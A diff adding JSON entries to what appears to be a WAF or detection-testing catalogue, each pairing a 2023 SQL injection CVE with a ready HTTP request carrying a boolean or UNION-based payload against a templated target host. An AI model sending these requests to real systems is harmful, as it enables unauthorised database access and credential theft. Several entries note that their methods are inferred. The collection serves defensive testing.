@@ -298016,6 +298016,864 @@
     "visible": true
   },
   {
+    "name": "CVE-2023-22630 - IzyBat Orange Casiers SQL Injection",
+    "displayName": "CVE-2023-22630 - IzyBat Orange Casiers SQL Injection",
+    "description": "IzyBat Orange casiers before 20221102_1 is vulnerable to SQL injection via the taille parameter of getCasier.php. The request sends a boolean-based SQL injection payload in the taille query parameter. No vendor WAF rule found; built from the advisory and CVE description.\n\nReferences used to recreate this request:\n- https://github.com/orangecertcc/security-research/security/advisories/GHSA-j94f-5cg6-6j9j (advisory)\n- https://nvd.nist.gov/vuln/detail/CVE-2023-22630 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /getCasier.php?taille=1%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2023-22630"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-22630",
+        "link": "https://github.com/orangecertcc/security-research/security/advisories/GHSA-j94f-5cg6-6j9j"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7299 - DataGear SQL Injection",
+    "displayName": "CVE-2023-7299 - DataGear SQL Injection",
+    "description": "DataGear up to 4.60 is vulnerable to injection via the sql argument of /dataSet/resolveSql. The request sends a UNION-based SQL injection signature in the sql form parameter. The public PoC (GitHub issue #29) demonstrates FreeMarker template injection in the same sql parameter, but the CVE is classified CWE-89 SQL injection, so a SQLi signature is used. HTTP method POST inferred (resolveSql is a form-processing action). No vendor WAF rule found; built from the PoC issue and VulDB.\n\nReferences used to recreate this request:\n- https://github.com/datageartech/datagear/issues/29 (PoC)\n- https://vuldb.com/?id.285658 (VulDB)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /dataSet/resolveSql HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nsql=SELECT+1+UNION+SELECT+username%2Cpassword+FROM+users--+-\n"
+    },
+    "cves": [
+      "CVE-2023-7299"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-7299",
+        "link": "https://github.com/datageartech/datagear/issues/29"
+      },
+      {
+        "title": "poc_vuldb for CVE-2023-7299",
+        "link": "https://vuldb.com/?id.285658"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7191 - S-CMS SQL Injection",
+    "displayName": "CVE-2023-7191 - S-CMS SQL Injection",
+    "description": "S-CMS up to 2.0_build20220529-20231006 is vulnerable to SQL injection in the member registration file /member/reg.php via the M_email argument (also M_login). The request sends a boolean-based SQL injection payload in the M_email form field. HTTP method POST inferred (registration form submission). No vendor WAF rule found; built from the VulDB description.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249393 (VulDB)\n- https://note.zhaoj.in/share/Fmytf7wBINbP (PoC write-up)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /member/reg.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nM_login=test&M_email=test%27+OR+1%3D1--+-&M_pwd=test\n"
+    },
+    "cves": [
+      "CVE-2023-7191"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2023-7191",
+        "link": "https://vuldb.com/?id.249393"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7190 - S-CMS SQL Injection",
+    "displayName": "CVE-2023-7190 - S-CMS SQL Injection",
+    "description": "S-CMS up to 2.0_build20220529-20231006 is vulnerable to SQL injection in /member/ad.php?action=ad via the A_text argument (also A_url, A_contact). The request sends a boolean-based SQL injection payload in the A_text form field with action=ad in the query. HTTP method POST inferred (advertisement submission form). No vendor WAF rule found; built from the VulDB description.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249392 (VulDB)\n- https://note.zhaoj.in/share/0ZY7hEQAskqM (PoC write-up)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /member/ad.php?action=ad HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nA_text=test%27+OR+1%3D1--+-&A_url=http%3A%2F%2Fexample&A_contact=x\n"
+    },
+    "cves": [
+      "CVE-2023-7190"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2023-7190",
+        "link": "https://vuldb.com/?id.249392"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7189 - S-CMS SQL Injection",
+    "displayName": "CVE-2023-7189 - S-CMS SQL Injection",
+    "description": "S-CMS up to 2.0_build20220529-20231006 is vulnerable to SQL injection in /s/index.php?action=statistics via the lid argument. The request sends a boolean-based SQL injection payload in the lid query parameter. GET method used (statistics view with id-style parameter). No vendor WAF rule found; built from the VulDB description.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249391 (VulDB)\n- https://note.zhaoj.in/share/9yaojoQvesLu (PoC write-up)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /s/index.php?action=statistics&lid=1%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2023-7189"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2023-7189",
+        "link": "https://vuldb.com/?id.249391"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7188 - Shipping 100 Fahuo100 SQL Injection",
+    "displayName": "CVE-2023-7188 - Shipping 100 Fahuo100 SQL Injection",
+    "description": "Shipping 100 Fahuo100 up to 1.1 is vulnerable to SQL injection in the login file member/login.php via the M_pwd argument. The request sends a boolean-based SQL injection payload in the M_pwd form field. HTTP method POST inferred (login form submission). No vendor WAF rule found; built from the VulDB description.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249390 (VulDB)\n- https://note.zhaoj.in/share/az24SaQJn1UQ (PoC write-up)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /member/login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nM_name=admin&M_pwd=test%27+OR+1%3D1--+-\n"
+    },
+    "cves": [
+      "CVE-2023-7188"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2023-7188",
+        "link": "https://vuldb.com/?id.249390"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7337 - JS Help Desk WordPress Plugin SQL Injection",
+    "displayName": "CVE-2023-7337 - JS Help Desk WordPress Plugin SQL Injection",
+    "description": "The JS Help Desk WordPress plugin <= 2.8.2 is vulnerable to unauthenticated SQL injection via the js-support-ticket-token-tkstatus cookie (an incomplete fix for CVE-2023-50839). The plugin reads this cookie globally on page load, so the request carries a boolean-based SQL injection payload in that exact cookie against the site root. GET method used. Built from the Wordfence advisory and the fix changeset.\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/b841531b-8728-4933-b3c4-d4e10cbdca79?source=cve (advisory)\n- https://plugins.trac.wordpress.org/changeset?old_path=/js-support-ticket/tags/2.8.2&new_path=/js-support-ticket/tags/2.8.3 (fix diff)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET / HTTP/1.1\nHost: {{target_host}}\nCookie: js-support-ticket-token-tkstatus=1' OR 1=1-- -\n\n"
+    },
+    "cves": [
+      "CVE-2023-7337"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "waf_rule_wordfence for CVE-2023-7337",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/b841531b-8728-4933-b3c4-d4e10cbdca79?source=cve"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7186 - 7-card Fakabao SQL Injection",
+    "displayName": "CVE-2023-7186 - 7-card Fakabao SQL Injection",
+    "description": "7-card Fakabao up to 1.0_build20230805 is vulnerable to SQL injection via the out_trade_no argument of /member/notify.php. The request sends a UNION SELECT payload in out_trade_no. No vendor WAF rule found; built from the VulDB entry. HTTP method inferred as GET (out_trade_no is a lookup identifier; the PoC link is a dead share and the repo was not accessible in this session).\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249388 (VulDB entry, file + argument)\n- https://note.zhaoj.in/share/xHPvSBwWtR4z (PoC, link reported broken)\n- https://www.cve.org/CVERecord?id=CVE-2023-7186 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /member/notify.php?out_trade_no=%27%20UNION%20SELECT%201,2,3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-7186"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2023-7186",
+        "link": "https://vuldb.com/?id.249388"
+      },
+      {
+        "title": "poc_note for CVE-2023-7186",
+        "link": "https://note.zhaoj.in/share/xHPvSBwWtR4z"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7185 - 7-card Fakabao SQL Injection",
+    "displayName": "CVE-2023-7185 - 7-card Fakabao SQL Injection",
+    "description": "7-card Fakabao up to 1.0_build20230805 is vulnerable to SQL injection via the out_trade_no argument of /shop/wxpay_notify.php. The request sends a UNION SELECT payload in out_trade_no. No vendor WAF rule found; built from the VulDB entry. HTTP method inferred as GET (out_trade_no is a lookup identifier; the PoC link is a dead share and the repo was not accessible in this session).\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249387 (VulDB entry, file + argument)\n- https://note.zhaoj.in/share/mqHZlle8Pcg8 (PoC, link reported broken)\n- https://www.cve.org/CVERecord?id=CVE-2023-7185 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /shop/wxpay_notify.php?out_trade_no=%27%20UNION%20SELECT%201,2,3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-7185"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2023-7185",
+        "link": "https://vuldb.com/?id.249387"
+      },
+      {
+        "title": "poc_note for CVE-2023-7185",
+        "link": "https://note.zhaoj.in/share/mqHZlle8Pcg8"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7184 - 7-card Fakabao SQL Injection",
+    "displayName": "CVE-2023-7184 - 7-card Fakabao SQL Injection",
+    "description": "7-card Fakabao up to 1.0_build20230805 is vulnerable to SQL injection via the out_trade_no argument of /shop/notify.php. The request sends a UNION SELECT payload in out_trade_no. No vendor WAF rule found; built from the VulDB entry. HTTP method inferred as GET (out_trade_no is a lookup identifier; the PoC link is a dead share and the repo was not accessible in this session).\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249386 (VulDB entry, file + argument)\n- https://note.zhaoj.in/share/Jo8N3eSeLx9c (PoC, link reported broken)\n- https://www.cve.org/CVERecord?id=CVE-2023-7184 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /shop/notify.php?out_trade_no=%27%20UNION%20SELECT%201,2,3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-7184"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2023-7184",
+        "link": "https://vuldb.com/?id.249386"
+      },
+      {
+        "title": "poc_note for CVE-2023-7184",
+        "link": "https://note.zhaoj.in/share/Jo8N3eSeLx9c"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7183 - 7-card Fakabao SQL Injection",
+    "displayName": "CVE-2023-7183 - 7-card Fakabao SQL Injection",
+    "description": "7-card Fakabao up to 1.0_build20230805 is vulnerable to SQL injection via the out_trade_no argument of /shop/alipay_notify.php. The request sends a UNION SELECT payload in out_trade_no. No vendor WAF rule found; built from the VulDB entry. HTTP method inferred as GET (out_trade_no is a lookup identifier; the PoC link is a dead share and the repo was not accessible in this session).\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249385 (VulDB entry, file + argument)\n- https://note.zhaoj.in/share/NjPfD9xxhVRr (PoC, link reported broken)\n- https://www.cve.org/CVERecord?id=CVE-2023-7183 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /shop/alipay_notify.php?out_trade_no=%27%20UNION%20SELECT%201,2,3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-7183"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2023-7183",
+        "link": "https://vuldb.com/?id.249385"
+      },
+      {
+        "title": "poc_note for CVE-2023-7183",
+        "link": "https://note.zhaoj.in/share/NjPfD9xxhVRr"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7180 - Tongda OA 2017 SQL Injection",
+    "displayName": "CVE-2023-7180 - Tongda OA 2017 SQL Injection",
+    "description": "Tongda OA 2017 up to 11.9 is vulnerable to SQL injection via the PROJ_ID_STR argument of general/project/proj/delete.php. The request sends a UNION SELECT payload in PROJ_ID_STR. No vendor WAF rule found; built from the VulDB entry. HTTP method inferred as GET (delete/id-style argument; GitHub PoC repo was not accessible in this session). Fixed in 11.10.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249367 (VulDB entry, file + argument)\n- https://github.com/Bobjones7/cve/blob/main/sql.md (PoC, repo not accessible in session)\n- https://www.cve.org/CVERecord?id=CVE-2023-7180 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /general/project/proj/delete.php?PROJ_ID_STR=-1%20UNION%20SELECT%201,2,3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-7180"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-7180",
+        "link": "https://github.com/Bobjones7/cve/blob/main/sql.md"
+      },
+      {
+        "title": "vuldb for CVE-2023-7180",
+        "link": "https://vuldb.com/?id.249367"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7179 - Campcodes Online College Library System SQL Injection",
+    "displayName": "CVE-2023-7179 - Campcodes Online College Library System SQL Injection",
+    "description": "Campcodes Online College Library System 1.0 is vulnerable to SQL injection via the id argument of /admin/category_row.php (HTTP POST request handler). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the VulDB entry and the public write-up. Method POST per the VulDB 'HTTP POST Request Handler' component.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249366 (VulDB entry, file + argument + POST)\n- https://medium.com/@heishou/libsystem-foreground-sql-injection-vulnerability-a98949964faf (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2023-7179 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/category_row.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nid=-1%20UNION%20SELECT%201,2,3--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-7179"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2023-7179",
+        "link": "https://vuldb.com/?id.249366"
+      },
+      {
+        "title": "poc_writeup for CVE-2023-7179",
+        "link": "https://medium.com/@heishou/libsystem-foreground-sql-injection-vulnerability-a98949964faf"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7178 - Campcodes Online College Library System SQL Injection",
+    "displayName": "CVE-2023-7178 - Campcodes Online College Library System SQL Injection",
+    "description": "Campcodes Online College Library System 1.0 is vulnerable to SQL injection via the id argument of /admin/book_row.php (HTTP POST request handler). The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the VulDB entry and the public write-up. Method POST per the VulDB 'HTTP POST Request Handler' component.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249365 (VulDB entry, file + argument + POST)\n- https://medium.com/@heishou/libsystem-foreground-sql-injection-vulnerability-5-5a761e5b73b8 (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2023-7178 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/book_row.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nid=-1%20UNION%20SELECT%201,2,3--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-7178"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2023-7178",
+        "link": "https://vuldb.com/?id.249365"
+      },
+      {
+        "title": "poc_writeup for CVE-2023-7178",
+        "link": "https://medium.com/@heishou/libsystem-foreground-sql-injection-vulnerability-5-5a761e5b73b8"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7177 - Campcodes Online College Library System SQL Injection",
+    "displayName": "CVE-2023-7177 - Campcodes Online College Library System SQL Injection",
+    "description": "Campcodes Online College Library System 1.0 is vulnerable to SQL injection via the category argument of /admin/book_add.php (HTTP POST request handler). The request sends a UNION SELECT payload in category. No vendor WAF rule found; built from the VulDB entry and the public write-up. Method POST per the VulDB 'HTTP POST Request Handler' component.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249364 (VulDB entry, file + argument + POST)\n- https://medium.com/@heishou/libsystem-foreground-sql-injection-vulnerability-4-cadc2983eb5e (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2023-7177 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/book_add.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ncategory=%27%20UNION%20SELECT%201,2,3--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-7177"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2023-7177",
+        "link": "https://vuldb.com/?id.249364"
+      },
+      {
+        "title": "poc_writeup for CVE-2023-7177",
+        "link": "https://medium.com/@heishou/libsystem-foreground-sql-injection-vulnerability-4-cadc2983eb5e"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7176 - Campcodes Online College Library System SQL Injection",
+    "displayName": "CVE-2023-7176 - Campcodes Online College Library System SQL Injection",
+    "description": "Campcodes Online College Library System 1.0 is vulnerable to SQL injection via the student argument of /admin/return_add.php (HTTP POST request handler). The request sends a UNION SELECT payload in student. No vendor WAF rule found; built from the VulDB entry and the public write-up. Method POST per the VulDB 'HTTP POST Request Handler' component.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249363 (VulDB entry, file + argument + POST)\n- https://medium.com/@heishou/libsystem-foreground-sql-injection-vulnerability-3-d02f0ce78fe3 (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2023-7176 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/return_add.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nstudent=%27%20UNION%20SELECT%201,2,3--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-7176"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2023-7176",
+        "link": "https://vuldb.com/?id.249363"
+      },
+      {
+        "title": "poc_writeup for CVE-2023-7176",
+        "link": "https://medium.com/@heishou/libsystem-foreground-sql-injection-vulnerability-3-d02f0ce78fe3"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7175 - Campcodes Online College Library System SQL Injection",
+    "displayName": "CVE-2023-7175 - Campcodes Online College Library System SQL Injection",
+    "description": "Campcodes Online College Library System 1.0 is vulnerable to SQL injection via the student argument of /admin/borrow_add.php (HTTP POST request handler). The request sends a UNION SELECT payload in student. No vendor WAF rule found; built from the VulDB entry and the public write-up. Method POST per the VulDB 'HTTP POST Request Handler' component.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249362 (VulDB entry, file + argument + POST)\n- https://medium.com/@heishou/libsystem-sql-injection-bb74915175fe (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2023-7175 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/borrow_add.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nstudent=%27%20UNION%20SELECT%201,2,3--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-7175"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "vuldb for CVE-2023-7175",
+        "link": "https://vuldb.com/?id.249362"
+      },
+      {
+        "title": "poc_writeup for CVE-2023-7175",
+        "link": "https://medium.com/@heishou/libsystem-sql-injection-bb74915175fe"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-7161 - Netentsec NS-ASG Application Security Gateway SQL Injection",
+    "displayName": "CVE-2023-7161 - Netentsec NS-ASG Application Security Gateway SQL Injection",
+    "description": "Netentsec NS-ASG Application Security Gateway 6.3.1 is vulnerable to SQL injection via the check_VirtualSiteId argument of the Login component (index.php?para=index). The request sends a UNION SELECT payload in check_VirtualSiteId. No vendor WAF rule found; built from the VulDB entry. HTTP method inferred as POST (login form action; para=index kept in the query string, the injected argument in the body; GitHub PoC repo was not accessible in this session).\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.249183 (VulDB entry, file + argument)\n- https://github.com/fixitc/cve/blob/main/sql.md (PoC, repo not accessible in session)\n- https://www.cve.org/CVERecord?id=CVE-2023-7161 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /index.php?para=index HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\ncheck_VirtualSiteId=-1%20UNION%20SELECT%201,2,3--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-7161"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-7161",
+        "link": "https://github.com/fixitc/cve/blob/main/sql.md"
+      },
+      {
+        "title": "vuldb for CVE-2023-7161",
+        "link": "https://vuldb.com/?id.249183"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-9305 - QuantumNous new-api SQL Injection",
     "displayName": "CVE-2026-9305 - QuantumNous new-api SQL Injection",
